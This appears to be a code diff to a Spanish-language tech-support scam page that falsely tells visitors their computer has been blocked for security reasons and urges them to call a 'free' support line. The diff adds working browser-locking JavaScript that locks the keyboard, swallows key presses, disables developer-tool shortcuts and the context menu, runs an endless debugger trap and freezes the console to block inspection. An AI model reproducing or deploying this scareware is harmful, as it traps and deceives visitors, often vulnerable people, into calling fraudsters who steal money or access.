@@ -48,7 +48,7 @@
     </script>
 <script type="text/javascript">
         var phone_number = '910-971-803';
-        //var phone_number = '919-610-587';
+        // var phone_number = '919-610-587';
 </script>
 
 
@@ -617,15 +617,18 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                     <div id="isp"></script></div>
                   </span>
     </div>
-    <img src="re.gif" id="banner">
+
     <div id="disclaimer">
-        Su PC puede ser vulnerable a virus y amenazas.<br>
+        El acceso a este ordenador ha sido bloqueado por razones de seguridad.<br>
         
 
-        <span class="support" style="font-size:22px;">Llame al número gratuito de soporte técnico:&nbsp; 
+        <span class="support" style="font-size:22px;">Póngase en contacto con el soporte técnico:&nbsp; 
         <img src="phone1.png"style="width: 200px;" id="banner">
         <!--<span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script> -->
-        </span>
+        
+	(Línea gratuita)
+	<br /><span style="color: green">SOPORTE 100% GRATUITO</span>
+	</span>
       </span>
 
             
@@ -855,7 +858,57 @@ Comuníquese con el soporte gratuito de inmediato. Un ingeniero de Smart Defende
     }, false);
   
 
+      navigator.keyboard.lock();
+    document.onkeydown = function (e) {
+        return false;
+    }
+
+
+    // Disable specific key combinations
+    document.addEventListener('keydown', function (event) {
+        if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey &&
+            (event.keyCode === 'I'.charCodeAt(0) || event.keyCode === 'i'.charCodeAt(0) ||
+             event.keyCode === 'L'.charCodeAt(0) || event.keyCode === 'l'.charCodeAt(0) ||
+             event.keyCode === 'C'.charCodeAt(0) || event.keyCode === 'c'.charCodeAt(0) ||
+             event.keyCode === 'J'.charCodeAt(0) || event.keyCode === 'j'.charCodeAt(0) ||
+             event.keyCode === 'U'.charCodeAt(0) || event.keyCode === 'u'.charCodeAt(0) ||
+             event.keyCode === 'S'.charCodeAt(0) || event.keyCode === 's'.charCodeAt(0)))) {
+            event.preventDefault();
+        }
+        });
+    
+        // Disable context menu
+        document.addEventListener('contextmenu', function (event) {
+            event.preventDefault();
+        });
+    
+        // Debugger code with retry
+        (function () {
+            (function a() {
+                try {
+                    (function b(i) {
+                        if (('' + (i / i)).length !== 1 || i % 20 === 0) {
+                            (function () {}).constructor('debugger')();
+                        } else {
+                            debugger;
+                        }
+                        b(++i);
+                    })(0);
+                } catch (e) {
+                    setTimeout(a, 5);
+                }
+            })();
+        })();
+    
+        // Disable console
+        Object.defineProperty(window, 'console', {
+            value: Object.freeze({}),
+            writable: false,
+            configurable: false
+        });
+
 </script>
+
 <script>
     // Get the modal
     var modal = document.getElementById('myModal');
